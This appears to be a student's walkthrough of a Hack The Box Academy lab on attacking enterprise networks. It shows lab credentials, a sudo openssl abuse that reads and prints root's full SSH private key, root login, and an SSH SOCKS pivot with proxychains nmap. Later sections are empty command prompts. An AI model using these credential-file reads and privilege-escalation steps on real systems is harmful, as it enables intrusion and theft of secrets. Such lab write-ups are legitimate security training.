# [Attacking Enterprise Networks](https://academy.hackthebox.com/module/details/163)

## Internal Testing

### Table of Contents

- [x] Internal Testing
	- [x] Post-Exploitation Persistence
	- [x] Internal Information Gathering
	- [x] Exploitation and Privilege Escalation
- [ ] Lateral Movement and Privilege Escalation
	- [ ] Lateral Movement
	- [ ] Active Directory Compromise
	- [ ] Post-Exploitation

---

### Post-Exploitation Persistence

Questions:
1. Escalate privileges on the target host and submit the contents of the `flag.txt` file in the `/root` directory. `a3498***************************`

```yaml
credentials:
    username: srvadm
    password: ILFreightnixadm!
    host: inlanefreight.local
    port: 22 (ssh)
```

```
┌──(nabla㉿kali)-[~]
└─$ ssh srvadm@inlanefreight.local

srvadm@inlanefreight.local's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

[SNIP]

$ bash -i
srvadm@dmz01:~$
```

```
srvadm@dmz01:~$ id

uid=1003(srvadm) gid=1003(srvadm) groups=1003(srvadm)
```

```
srvadm@dmz01:~$ sudo -l

[SNIP]

User srvadm may run the following commands on dmz01:
    (ALL) NOPASSWD: /usr/bin/openssl
```

![Firefox - GTFOBins openssl File Read](./assets/screenshots/attacking_enterprise_networks_internal_testing_01.png)

```
srvadm@dmz01:~$ LFILE=/root/.ssh/id_rsa; sudo openssl enc -in "$LFILE"

-----BEGIN OPENSSH PRIVATE KEY-----
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
WNfJbbEPrmQf0AAAALcm9vdEB1YnVudHU=
-----END OPENSSH PRIVATE KEY-----
```

```
┌──(nabla㉿kali)-[~]
└─$ vim root_ssh_sk

[SNIP]
```

```
┌──(nabla㉿kali)-[~]
└─$ chmod 600 root_ssh_sk
```

```
┌──(nabla㉿kali)-[~]
└─$ ssh -i root_ssh_sk root@inlanefreight.local

[SNIP]

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

root@dmz01:~# 
```

```
root@dmz01:~# id

uid=0(root) gid=0(root) groups=0(root)
```

```
root@dmz01:~# root@dmz01:~# cat /root/flag.txt

a3498*************************** 📌
```

```
root@dmz01:~# ifconfig | grep -w inet -B1

--
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.69.184  netmask 255.255.0.0  broadcast 10.129.255.255
--
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.8.120  netmask 255.255.0.0  broadcast 172.16.255.255
```

---

### Internal Information Gathering

Questions:
1. Mount an NFS share and find a `flag.txt` file. Submit the contents as your answer. ``

```
┌──(nabla㉿kali)-[~]
└─$ grep socks4 /etc/proxychains.conf

#	 	socks4	192.168.1.49	1080
#       proxy types: http, socks4, socks5, raw
socks4 	127.0.0.1 9050
```

```
┌──(nabla㉿kali)-[~]
└─$ ssh -i root_ssh_sk -D 9050 root@inlanefreight.local

[SNIP]

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

root@dmz01:~# 
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo netstat -antp | grep 9050

tcp        0      0 127.0.0.1:9050          0.0.0.0:*               LISTEN      39834/ssh           
tcp6       0      0 ::1:9050                :::*                    LISTEN      39834/ssh
```

```
┌──(nabla㉿kali)-[~]
└─$ proxychains nmap -sT -p21,22,80,8080 172.16.8.120

[SNIP]


```

```
┌──(nabla㉿kali)-[~]
└─$ 
```

```
┌──(nabla㉿kali)-[~]
└─$ 
```

---

### Exploitation and Privilege Escalation

Questions:
1. Retrieve the contents of the SAM database on the DEV01 host. Submit the NT hash of the administrator user as your answer.
2. Escalate privileges on the DEV01 host. Submit the contents of the `flag.txt` file on the `Administrator` Desktop.

```
┌──(nabla㉿kali)-[~]
└─$ 
```

```
┌──(nabla㉿kali)-[~]
└─$ 
```

```
┌──(nabla㉿kali)-[~]
└─$ 
```

```
┌──(nabla㉿kali)-[~]
└─$ 
```

---
---
